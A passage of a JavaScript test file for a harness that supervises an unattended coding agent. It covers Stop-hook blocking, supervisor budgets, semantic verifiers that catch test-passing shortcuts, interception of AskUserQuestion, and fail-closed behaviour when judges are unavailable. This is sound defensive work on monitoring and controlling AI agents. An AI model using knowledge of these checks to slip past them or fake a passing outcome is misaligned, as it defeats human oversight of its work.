    : { status: 0, stdout: JSON.stringify({ loggedIn: true }), stderr: "" } });
  assert.equal(missing.ok, false);
  assert.match(missing.error, /--settings/);
  const loggedOut = preflightWorkerCli("fake", { run: (_executable, args) => args[0] === "--help"
    ? { status: 0, stdout: goodHelp, stderr: "" }
    : { status: 1, stdout: JSON.stringify({ loggedIn: false, authMethod: "none" }), stderr: "" } });
  assert.equal(loggedOut.ok, false);
  assert.match(loggedOut.error, /not logged in.*login|not logged in.*setup-token/);

  const command = resolveSupervisorCommand("claude -p", "/Applications/Claude App/claude");
  assert.match(command, /^"\/Applications\/Claude App\/claude" -p/);
  assert.match(command, /--setting-sources ""/);
  assert.match(command, /--tools ""/);
  assert.match(command, /--allowed-tools ""/);
  assert.match(command, /--permission-mode dontAsk/);
  assert.match(command, /--strict-mcp-config/);
  assert.match(command, /mcpServers/);
  assert.match(command, /--no-session-persistence/);
  const arrayCommand = resolveSupervisorCommand(["/opt/Claude/claude", "-p"], "unused");
  assert.deepEqual(arrayCommand.slice(-2), ["--no-chrome", "--no-session-persistence"]);
  assert.ok(arrayCommand.includes("--allowed-tools"));

  const mandate = workerMandate({
    contract: { seal: "seal", ask: "do the real thing", semantic: { successCriteria: ["real"] } },
    baseline: { files: {
      "CLAUDE.md": { text: "preserve the public API" },
      "src/secret.js": { text: "not an instruction source" },
    } },
  });
  assert.match(mandate, /preserve the public API/);
  assert.doesNotMatch(mandate, /not an instruction source/);
  assert.ok(mandate.length <= 48_000);
});

test("the runtime supervisor budget is global across diagnosis, audits and semantic verification", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "red" };
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "green" };
  const h = harness({
    acceptanceResults: [red, green, green],
    maxSupervisorCalls: 2,
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: false,
      drift: "red",
      plan: ["edit src/value.js"],
      expectedNextActions: ["edit:src/value.js"],
      acceptanceRisk: "red",
    } }),
  });
  const first = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(first.output.decision, "block");
  applyObservedCorrection(h);
  const second = h.controller.stop({ input: { hook_event_name: "Stop", stop_hook_active: true,
    transcript_path: h.transcript } });
  assert.equal(second.output.decision, "approve",
    "budget exhaustion terminates incomplete instead of holding the worker forever");
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, false);
  const events = h.store.events();
  assert.equal(events.filter((event) => event.type === "supervisor_call_reserved").length, 2);
  assert.ok(events.some((event) => event.type === "supervisor_call_budget_exhausted"));
});

test("non-interactive tools are converted into a supervisor-authored continuation, never a human wait", () => {
  const h = harness({
    acceptanceResults: [
      { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" },
    ],
    supervisorHandler: ({ packet }) => {
      assert.equal(packet.trigger, "unattended-interaction:AskUserQuestion");
      assert.equal(packet.proposedTool.name, "AskUserQuestion");
      assert.match(JSON.stringify(packet.proposedTool.input), /Which implementation/);
      return { ok: true, verdict: {
        onTrack: false,
        drift: "worker tried to hand an already-frozen architectural choice back to the sleeping operator",
        plan: ["use the rolling-window mechanism required by the frozen contract"],
        expectedNextActions: ["edit:src/value.js"],
        acceptanceRisk: "fixed-window choice would fail semantic acceptance",
      } };
    },
  });
  const result = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse",
    tool_name: "AskUserQuestion",
    tool_input: { questions: [{ question: "Which implementation should I use?" }] },
    transcript_path: h.transcript,
  } });
  assert.equal(result.output.hookSpecificOutput.permissionDecision, "deny");
  assert.match(result.output.hookSpecificOutput.permissionDecisionReason, /不能等待 AskUserQuestion/);
  assert.match(result.output.hookSpecificOutput.permissionDecisionReason, /OUTSIDER_INTERVENTION:/);
  assert.ok(h.store.events().some((event) => event.type === "unattended_interaction_intercepted"));
});

test("green mechanical acceptance cannot release Stop until semantic outcome is repaired", () => {
  let verifierCalls = 0;
  let supervisorCalls = 0;
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "all visible tests passed" };
  const h = harness({
    acceptanceResults: [green, green, green],
    verifierHandler: () => {
      verifierCalls += 1;
      return { ok: true, verdict: verifierCalls === 1 ? {
        passed: false,
        gaps: ["只改了表面返回值，冻结的公开 API 机制仍未成立"],
        evidence: ["内容级 diff 显示 shortcut 仍存在"],
      } : {
        passed: true,
        gaps: [],
        evidence: ["最终机制和公开 API 均满足冻结合同"],
      } };
    },
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      assert.equal(packet.acceptance.passed, true, "the supervisor sees that tests were already green");
      assert.equal(packet.semanticOutcome.passed, false);
      assert.match(packet.semanticOutcome.gaps.join(" "), /表面返回值/);
      return { ok: true, verdict: {
        onTrack: false,
        drift: "机械绿灯掩盖了语义机制缺口",
        plan: ["修正 src/value.js 的实际公开行为"],
        expectedNextActions: ["edit:src/value.js"],
        acceptanceRisk: "语义验收仍会失败",
      } };
    },
  });
  const first = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(first.output.decision, "block", "worker must remain alive at the Stop boundary");
  assert.match(first.output.reason, /OUTSIDER_INTERVENTION:/);
  applyObservedCorrection(h);
  const second = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(second.output.decision, "approve");
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
  assert.equal(supervisorCalls, 1);
  assert.equal(verifierCalls, 2,
    "finish must reuse the exact content-addressed Stop verdict instead of discovering gaps after exit");
  assert.ok(h.store.events().some((event) => event.type === "outcome_verification_reused"));
});

test("Stop reuses an independently audited integration PASS for the exact same tree", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const h = harness({
    acceptanceResults: [green],
    verifierHandler: () => { throw new Error("same-fingerprint integration PASS must be reused"); },
  });
  const fingerprint = h.store.readJson("baseline.json").fingerprint;
  const interventionId = "integration-reuse-intervention";
  h.store.append("acceptance_finished", {
    interventionId, phase: "integration", ran: true, passed: true, exit: 0,
    command: "npm test", finalFingerprint: fingerprint,
  });
  const audit = h.store.append("outcome_approval_audit", {
    interventionId, phase: "integration", finalFingerprint: fingerprint,
    passed: true, errors: [], verifiedFacts: ["same tree independently approved"],
    insufficient: null,
  });
  const source = h.store.append("outcome_verdict", {
    interventionId, phase: "integration", finalFingerprint: fingerprint,
    passed: true, verifierProposedPassed: true, approvalAuditPassed: true,
    approvalAuditSeq: audit.seq, gaps: [], evidence: ["integration outcome passed"],
    insufficient: null,
  });
  h.store.saveState({
    lastResolvedInterventionId: interventionId,
    lastResolvedInterventionAuthorityHash: "sha256:reuse-authority",
    lastResolvedInterventionObserved: true,
    lastResolvedInterventionEffectObserved: true,
  });

  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "approve");
  const reused = h.store.events().find((event) =>
    event.type === "outcome_verification_reused" && event.sourceSeq === source.seq);
  assert.equal(reused.sourcePhase, "integration");
  const stopOutcome = h.store.events().find((event) =>
    event.type === "outcome_verdict" && event.phase === "stop");
  assert.equal(stopOutcome.source, "content-addressed-audited-outcome");
  assert.equal(stopOutcome.approvalAuditSeq, audit.seq);
  assert.equal(stopOutcome.finalFingerprint, fingerprint);
  assert.equal(h.store.events().some((event) =>
    event.type === "outcome_verifier_requested"), false);
});

test("a substantive semantic RED is sticky until the workspace fingerprint changes", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const h = harness({
    acceptanceResults: [green],
    verifierHandler: () => {
      throw new Error("unchanged content must not be resampled after a substantive RED");
    },
  });
  const fingerprint = h.store.readJson("baseline.json").fingerprint;
  const source = h.store.append("outcome_verdict", {
    interventionId: null,
    phase: "integration",
    finalFingerprint: fingerprint,
    passed: false,
    gaps: ["src/store.js is orphaned while src/index.js duplicates its state machine"],
    evidence: ["src/index.js does not import src/store.js"],
    insufficient: null,
  });

  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.equal(h.store.events().some((event) =>
    event.type === "outcome_verifier_requested"), false);
  const conflict = h.store.events().find((event) =>
    event.type === "outcome_conflict_sticky_red");
  assert.equal(conflict.sourceOutcomeVerdictSeq, source.seq);
  assert.equal(conflict.finalFingerprint, fingerprint);
  const locked = h.store.events().find((event) =>
    event.type === "outcome_verdict" && event.phase === "stop");
  assert.equal(locked.passed, false);
  assert.equal(locked.source, "same-fingerprint-rejection-lock");
  assert.equal(locked.sourceOutcomeVerdictSeq, source.seq);
  assert.match(locked.gaps.join(" "), /src\/store\.js is orphaned/);
});

test("an exact successful controller checkpoint reuses the audited Stop outcome for the same tree", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const h = harness({
    acceptanceResults: [green],
    verifierHandler: () => { throw new Error("exact checkpoint must not buy another model verdict"); },
  });
  h.store.writeJson("endurance-preregistration.json", { shiftPolicy: { checks: [
    "read:src/value.js", "run:npm test",
  ] } });
  const fingerprint = h.store.readJson("baseline.json").fingerprint;
  h.store.append("acceptance_finished", {
    interventionId: null, phase: "stop", ran: true, passed: true, exit: 0,
    command: "npm test", finalFingerprint: fingerprint,
  });
  const audit = h.store.append("outcome_approval_audit", {
    interventionId: null, phase: "stop", finalFingerprint: fingerprint,
    passed: true, errors: [], verifiedFacts: ["same tree independently approved"],
    insufficient: null,
  });
  const source = h.store.append("outcome_verdict", {
    interventionId: null, phase: "stop", finalFingerprint: fingerprint,
    passed: true, verifierProposedPassed: true, approvalAuditPassed: true,
    approvalAuditSeq: audit.seq, gaps: [], evidence: ["prior Stop passed"],
    insufficient: null,
  });
  const dispatch = h.store.append("endurance_shift_dispatched", {
    kind: "checkpoint", ordinal: 2, afterApprovedStopSeq: source.seq,
  });
  h.store.append("endurance_shift_input_submitted", {
    kind: "checkpoint", ordinal: 2, dispatchedAtSeq: dispatch.seq,
  });
  h.store.append("boundary_reached", {
    boundary: "PostToolUse", tool: "Read", toolUseId: "checkpoint-read",
    file: path.join(h.cwd, "src/value.js"), action: `Read(${path.join(h.cwd, "src/value.js")})`,
    exit: 0, agentId: "main",
  });
  h.store.append("boundary_reached", {
    boundary: "PostToolUse", tool: "Bash", toolUseId: "checkpoint-test",
    action: "npm test", exit: 0, agentId: "main",
  });

  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "approve");
  const reused = h.store.events().find((event) =>
    event.type === "outcome_verification_reused" && event.sourceSeq === source.seq);
  assert.equal(reused.shiftDispatchSeq, dispatch.seq);
  assert.match(reused.shiftEvidenceHash, /^sha256:/);
  const stopOutcome = [...h.store.events()].reverse().find((event) =>
    event.type === "outcome_verdict" && event.phase === "stop");
  assert.equal(stopOutcome.source, "controller-checkpoint-content-addressed-outcome");
  assert.equal(stopOutcome.approvalAuditSeq, audit.seq);
  assert.equal(h.store.events().some((event) => event.type === "outcome_verifier_requested"), false);
});

test("an exact recovery checkpoint continuation reuses its resolved audited Stop outcome", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const h = harness({
    acceptanceResults: [green],
    verifierHandler: () => { throw new Error("recovery checkpoint continuation must not buy another model verdict"); },
  });
  const fingerprint = h.store.readJson("baseline.json").fingerprint;
  const interventionId = "recovery-drill-intervention";
  h.store.append("acceptance_finished", {
    interventionId, phase: "stop", ran: true, passed: true, exit: 0,
    command: "npm test", finalFingerprint: fingerprint,
  });
  const audit = h.store.append("outcome_approval_audit", {
    interventionId, phase: "stop", finalFingerprint: fingerprint,
    passed: true, errors: [], verifiedFacts: ["recovery repair independently approved"],
    insufficient: null,
  });
  const source = h.store.append("outcome_verdict", {
    interventionId, phase: "stop", finalFingerprint: fingerprint,
    passed: true, verifierProposedPassed: true, approvalAuditPassed: true,
    approvalAuditSeq: audit.seq, gaps: [], evidence: ["recovery repair passed"],
    insufficient: null,
  });
  const resolved = h.store.append("intervention_resolved", { interventionId,
    correctionAuthorityHash: "sha256:recovery-authority" });
  h.store.saveState({
    lastResolvedInterventionId: interventionId,
    lastResolvedInterventionAuthorityHash: "sha256:recovery-authority",
    lastResolvedInterventionObserved: true,
    lastResolvedInterventionEffectObserved: true,
    lastResolvedInterventionArtifactFingerprint: fingerprint,
  });
  const continuation = h.store.append(
    "endurance_recovery_checkpoint_continuation_dispatched", {
      ordinal: 1, interventionId, resolvedSeq: resolved.seq,
      afterApprovedStopSeq: source.seq, currentCheckpointCount: 1,
      targetCheckpointCount: 2,
    });
  h.store.append("endurance_shift_input_submitted", {
    kind: "recovery-checkpoint-continuation", ordinal: 1,
    dispatchedAtSeq: continuation.seq,
  });
  h.store.append("boundary_reached", {
    boundary: "PostToolUse", tool: "Bash", toolUseId: "recovery-checkpoint",
    action: "npm test", exit: 0, agentId: "main",
  });

  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "approve");
  const reused = h.store.events().find((event) =>
    event.type === "outcome_verification_reused" && event.sourceSeq === source.seq);
  assert.equal(reused.shiftDispatchSeq, continuation.seq);
  assert.match(reused.shiftEvidenceHash, /^sha256:/);
  const stopOutcome = [...h.store.events()].reverse().find((event) =>
    event.type === "outcome_verdict" && event.phase === "stop");
  assert.equal(stopOutcome.source, "controller-checkpoint-content-addressed-outcome");
  assert.equal(stopOutcome.approvalAuditSeq, audit.seq);
  assert.equal(h.store.events().some((event) => event.type === "outcome_verifier_requested"), false);
});

test("checkpoint outcome reuse fails closed for an unclassified completed action", () => {
  let verifierCalls = 0;
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const h = harness({
    acceptanceResults: [green],
    verifierHandler: () => { verifierCalls += 1; return { ok: true, verdict: {
      passed: true, gaps: [], evidence: ["fresh verification required"],
    } }; },
  });
  h.store.writeJson("endurance-preregistration.json", { shiftPolicy: { checks: [
    "read:src/value.js", "run:npm test",
  ] } });
  const fingerprint = h.store.readJson("baseline.json").fingerprint;
  h.store.append("acceptance_finished", { interventionId: null, phase: "stop",
    ran: true, passed: true, exit: 0, command: "npm test", finalFingerprint: fingerprint });
  const audit = h.store.append("outcome_approval_audit", { interventionId: null, phase: "stop",
    finalFingerprint: fingerprint, passed: true, errors: [], verifiedFacts: ["prior pass"],
    insufficient: null });
  const source = h.store.append("outcome_verdict", { interventionId: null, phase: "stop",
    finalFingerprint: fingerprint, passed: true, approvalAuditSeq: audit.seq,
    gaps: [], evidence: ["prior pass"], insufficient: null });
  const dispatch = h.store.append("endurance_shift_dispatched", {
    kind: "checkpoint", ordinal: 2, afterApprovedStopSeq: source.seq,
  });
  h.store.append("endurance_shift_input_submitted", {
    kind: "checkpoint", ordinal: 2, dispatchedAtSeq: dispatch.seq,
  });
  h.store.append("boundary_reached", { boundary: "PostToolUse", tool: "Read",
    toolUseId: "checkpoint-read", file: path.join(h.cwd, "src/value.js"),
    action: `Read(${path.join(h.cwd, "src/value.js")})`, exit: 0, agentId: "main" });
  h.store.append("boundary_reached", { boundary: "PostToolUse", tool: "Write",
    toolUseId: "unexpected-write", file: path.join(h.cwd, "outside.txt"),
    action: "Write(outside.txt)", exit: 0, agentId: "main" });
  h.store.append("boundary_reached", { boundary: "PostToolUse", tool: "Bash",
    toolUseId: "checkpoint-test", action: "npm test", exit: 0, agentId: "main" });

  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "approve");
  assert.equal(verifierCalls, 1);
  assert.equal(h.store.events().some((event) => event.type === "outcome_verification_reused"
    && event.sourceSeq === source.seq), false);
});

test("an unavailable semantic verifier fails closed at Stop", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const h = harness({
    acceptanceResults: [green],
    verifierHandler: () => ({ ok: false, error: "supervisor offline" }),
    supervisorHandler: () => ({ ok: false, error: "supervisor offline" }),
  });
  const result = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(result.output.decision, "block");
  assert.match(result.output.reason, /语义验收无法完成/);
  assert.equal(h.store.events().some((event) => event.type === "outcome_verifier_failed"), true);
  assert.equal(h.store.events().some((event) => event.type === "outcome_verdict" && event.passed), false);
});

test("a failed semantic verifier still seals the exact evidence packet it saw", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "public green" };
  const packet = { acceptance: green, currentSource: "mechanically green but semantically suspect" };
  const h = harness({
    acceptanceResults: [green],
    verifierHandler: () => ({ ok: false, error: "INVALID_JSON_RESPONSE", packet }),
    supervisorHandler: () => ({ ok: false, error: "supervisor offline" }),
  });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const failed = h.store.events().find((event) => event.type === "outcome_verifier_failed");
  assert.ok(failed.evidenceFile, "a model failure must not censor whether an attack was exposed");
  assert.match(failed.evidenceHash, /^sha256:/);
  assert.deepEqual(h.store.readJson(failed.evidenceFile), packet);
});

test("Stop judge schema failure preserves one intervention until the same-ID audit passes", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "expected 2" };
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  let auditCalls = 0;
  const feedback = [];
  const h = harness({
    acceptanceResults: [red, green, green, green],
    outcomeAuditorHandler: (options) => {
      auditCalls += 1;
      feedback.push(options.validationFeedback ?? null);
      if (auditCalls <= 2) return {
        ok: false,
        error: "SCHEMA_INVALID_RESPONSE:passed=true requires errors=[]",
        failure: {
          kind: "schema-invalid", retryable: true,
          retryInstruction: "When passed is true, return errors as an empty array",
          schemaViolations: ["passed=true requires errors=[]"],
        },
      };
      return { ok: true, packet: { audit: "same artifact" }, verdict: {
        passed: true, errors: [], verifiedFacts: ["the corrected value is 2"],
      } };
    },
  });

  const first = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(first.output.decision, "block");
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  assert.ok(correction?.interventionId);
  applyObservedCorrection(h);

  const pending = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(pending.output.decision, "block");
  assert.equal(pending.decision.corrective, null, "judge failure is not a new worker correction");
  assert.equal(feedback[0], null);
  assert.match(feedback[1], /errors as an empty array/,
    "the in-call schema retry receives the validator's concrete repair instruction");
  let events = h.store.events();
  assert.equal(events.filter((event) => event.type === "boundary_paused").length, 1);
  assert.equal(events.filter((event) => event.type === "correction_emitted").length, 1);
  assert.equal(events.some((event) => event.type === "intervention_unresolved"), false);
  const retained = h.store.readState().openInterventions.main;
  assert.equal(retained.id, correction.interventionId);
  assert.equal(retained.correctionAuthorityHash, correction.correctionAuthorityHash);
  assert.ok(events.some((event) => event.type === "semantic_judge_retry_deferred"
    && event.interventionId === correction.interventionId));

  const approved = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(approved.output.decision, "approve");
  events = h.store.events();
  const sameId = (type) => events.find((event) => event.type === type
    && event.interventionId === correction.interventionId);
  assert.equal(sameId("acceptance_finished").interventionId, correction.interventionId);
  assert.equal(sameId("outcome_verdict").interventionId, correction.interventionId);
  assert.equal(sameId("intervention_resolved").correctionAuthorityHash,
    correction.correctionAuthorityHash);
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
});

test("invalid JSON verifier transport preserves the same intervention and spends no correction dose", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "expected 2" };
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  let verifierCalls = 0;
  const h = harness({
    acceptanceResults: [red, green, green, green],
    verifierHandler: () => {
      verifierCalls += 1;
      if (verifierCalls <= 2) return { ok: false,
        error: "INVALID_JSON_RESPONSE:unexpected prose",
        failure: { kind: "invalid-json", retryable: true,
          retryInstruction: "return one JSON object" } };
      return { ok: true, verdict: {
        passed: true, gaps: [], evidence: ["the corrected artifact was recomputed"],
      } };
    },
  });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  applyObservedCorrection(h);
  const pending = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(pending.output.decision, "block");
  let events = h.store.events();
  assert.equal(events.filter((event) => event.type === "boundary_paused").length, 1);
  assert.equal(events.filter((event) => event.type === "correction_emitted").length, 1);
  assert.equal(events.find((event) => event.type === "correction_emitted").attempt, 1);
  assert.equal(events.some((event) => event.type === "intervention_unresolved"), false);
  assert.equal(h.store.readState().openInterventions.main.id, correction.interventionId);
  assert.equal(h.store.readState().openInterventions.main.correctionAuthorityHash,
    correction.correctionAuthorityHash);
  const approved = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(approved.output.decision, "approve");
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
  events = h.store.events();
  assert.ok(events.some((event) => event.type === "intervention_resolved"
    && event.interventionId === correction.interventionId
    && event.correctionAuthorityHash === correction.correctionAuthorityHash));
});

test("insufficient and failed judges spend zero correction attempts", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "still red" };
  let diagnosisCalls = 0;
  const h = harness({
    acceptanceResults: [red, red, red, red, red],
    supervisorHandler: () => {
      diagnosisCalls += 1;
      if (diagnosisCalls <= 4) return { ok: true, verdict: {
        onTrack: false, drift: "", plan: [], expectedNextActions: [],
        acceptanceRisk: "unknown", insufficient: "need one more durable source fact",
      } };
      return { ok: true, verdict: {
        onTrack: false,
        drift: "value remains 1 instead of the frozen value 2",
        plan: ["edit src/value.js to export value 2"],
        expectedNextActions: ["edit:src/value.js"],
        acceptanceRisk: "red until edited",
      } };
    },
  });
  for (let index = 0; index < 4; index += 1) {
    const pending = h.controller.stop({ input: {
      hook_event_name: "Stop", transcript_path: h.transcript,
    } });
    assert.equal(pending.output.decision, "block");
  }
  const corrected = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(corrected.output.decision, "block");
  const emitted = h.store.events().find((event) => event.type === "correction_emitted");
  assert.equal(emitted.attempt, 1);
  assert.equal(h.store.events().some((event) => event.type === "intervention_budget_exhausted"), false);
  assert.equal(h.store.events().filter((event) => event.type === "correction_emitted").length, 1);
});

test("non-decisive provenance uncertainty cannot suppress an actionable semantic repair", () => {
  const h = harness({
    acceptanceResults: [
      { ran: true, passed: true, exit: 0, command: "npm test", output: "public green" },
      { ran: true, passed: true, exit: 0, command: "npm test", output: "public green" },
    ],
    outcomeVerdict: {
      passed: false,
      gaps: ["src/value.js still exports 1 instead of the frozen value 2"],
      evidence: ["controller-owned current source says value=1"],
    },
    supervisorHandler: ({ packet }) => {
      assert.equal(packet.semanticOutcome.passed, false);
      return { ok: true, verdict: {
        onTrack: false,
        drift: "src/value.js contradicts the frozen semantic criterion",
        plan: ["edit src/value.js to export value 2"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "semantic acceptance remains red",
        insufficient: "the visible trajectory does not identify who introduced the current byte",
      } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  const events = h.store.events();
  const correction = events.find((event) => event.type === "correction_emitted");
  assert.ok(correction?.correctionAuthorityHash);
  assert.ok(events.some((event) => event.type
    === "supervisor_insufficiency_reclassified_as_advisory"
    && event.interventionId === correction.interventionId));
  assert.equal(events.some((event) => event.type === "supervisor_insufficient"), false);
  assert.equal(events.some((event) => event.type === "correction_factual_audit"
    && event.passed === true), true);
});

test("older trajectory bytes cannot overrule a hashed current edit preimage", () => {
  const h = harness({
    controllerOwnedWorkspace: true,
    acceptanceResults: [
      { ran: true, passed: true, exit: 0, command: "npm test", output: "public green" },
      { ran: true, passed: true, exit: 0, command: "npm test", output: "public green" },
    ],
    outcomeVerdict: {
      passed: false,
      gaps: ["src/value.js currently exports 1 instead of the frozen value 2"],
      evidence: ["controller-owned current source and diff.after agree on value=1"],
    },
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: false,
      drift: "the current controller snapshot contradicts the frozen semantic criterion",
      plan: ["edit src/value.js to export value 2"],
      expectedNextActions: ["edit:src/value.js", "run:acceptance"],
      acceptanceRisk: "semantic acceptance remains red",
    } }),
    correctionAuditorHandler: ({ evidence, proposal }) => {
      const current = evidence.currentSourceEvidence.find((item) => item.path === "src/value.js");
      const edit = proposal.expectedActions.find((item) => item.kind === "edit");
      assert.equal(edit.preSha256, current.sha256);
      assert.equal(evidence.workspaceEvidence.canonicalArtifact.authority, "controller-owned");
      return { ok: true, packet: { evidence, proposal }, verdict: {
        decision: "insufficient",
        passed: false,
        errors: [],
        blockingErrors: [],
        notes: ["protected paths and the repair scope are correct"],
        verifiedFacts: ["the current edit preimage matches the controller-owned source hash"],
        insufficient: "an older worker Read showed different bytes and did not identify the author",
        insufficientReason: "an older worker Read showed different bytes and did not identify the author",
      } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  const events = h.store.events();
  const correction = events.find((event) => event.type === "correction_emitted");
  assert.ok(correction?.correctionAuthorityHash);
  const override = events.find((event) => event.type
    === "correction_audit_insufficiency_reclassified_as_advisory");
  assert.equal(override.interventionId, correction.interventionId);
  assert.equal(override.auditorDecision, "insufficient");
  const audit = events.find((event) => event.type === "correction_factual_audit");
  assert.equal(audit.passed, true);
  assert.equal(audit.decision, "pass");
  assert.equal(audit.auditorDecision, "insufficient");
  assert.equal(audit.temporalAuthorityOverride, true);
  assert.match(audit.notes.at(-1), /provenance advisory/u);
});

test("temporal authority does not promote an insufficient read-only proposal", () => {
  const h = harness({
    acceptanceResults: [
      { ran: true, passed: true, exit: 0, command: "npm test", output: "public green" },
      { ran: true, passed: true, exit: 0, command: "npm test", output: "public green" },
    ],
    outcomeVerdict: {
      passed: false,
      gaps: ["src/value.js currently exports 1 instead of the frozen value 2"],
      evidence: ["controller-owned current source says value=1"],
    },
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: false,
      drift: "the current value is wrong but the repair is not yet specified",
      plan: ["inspect src/value.js before deciding how to repair it"],
      expectedNextActions: ["read:src/value.js"],
      acceptanceRisk: "semantic acceptance remains red",
    } }),
    correctionAuditorHandler: () => ({ ok: true, packet: {}, verdict: {
      decision: "insufficient",
      passed: false,
      errors: [],
      blockingErrors: [],
      notes: [],
      verifiedFacts: ["the source needs a repair"],
      insufficient: "the proposal contains no authority-bearing edit",
      insufficientReason: "the proposal contains no authority-bearing edit",
    } }),
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  const events = h.store.events();
  assert.equal(events.some((event) => event.type
    === "correction_audit_insufficiency_reclassified_as_advisory"), false);
  assert.equal(events.some((event) => event.type === "correction_emitted"), false);
  assert.equal(events.filter((event) => event.type === "correction_factual_audit"
    && event.passed === false).length, 2);
});

test("rejected correction drafts spend zero attempts before the first delivered dose", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "still red" };
  let auditCalls = 0;
  const h = harness({
    acceptanceResults: [red, red],
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: false,
      drift: "value remains 1 instead of the frozen value 2",
      plan: ["edit src/value.js to export value 2"],
      expectedNextActions: ["edit:src/value.js"],
      acceptanceRisk: "red until edited",
    } }),
    correctionAuditorHandler: () => {
      auditCalls += 1;
      if (auditCalls <= 2) return { ok: true, verdict: {
        passed: false,
        errors: ["the proposed repair expands the frozen contract"],
        verifiedFacts: ["the visible failure is real"],
      } };
      return { ok: true, verdict: {
        passed: true, errors: [], verifiedFacts: ["the repaired proposal is bounded"],
      } };
    },
  });
  const withheld = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(withheld.output.decision, "block");
  assert.equal(h.store.events().filter((event) => event.type === "correction_emitted").length, 0);
  const delivered = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(delivered.output.decision, "block");
  const emitted = h.store.events().find((event) => event.type === "correction_emitted");
  assert.equal(emitted.attempt, 1);
  assert.equal(h.store.events().some((event) => event.type === "intervention_budget_exhausted"), false);
});

test("same-ID judge retries terminate conservatively only when the global judge budget is exhausted", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "expected 2" };
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const h = harness({
    maxSupervisorCalls: 7,
    acceptanceResults: [red, green, green],
    outcomeAuditorHandler: () => ({
      ok: false,
      error: "SCHEMA_INVALID_RESPONSE:passed=true requires errors=[]",
      failure: { kind: "schema-invalid", retryable: true,
        retryInstruction: "return errors=[]", schemaViolations: ["errors must be empty"] },
    }),
  });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  applyObservedCorrection(h);
  const pending = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(pending.output.decision, "block");
  assert.equal(h.store.readState().openInterventions.main.id, correction.interventionId);
  const terminal = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(terminal.output.decision, "approve");
  assert.equal(h.store.readState().openInterventions.main.id, correction.interventionId,
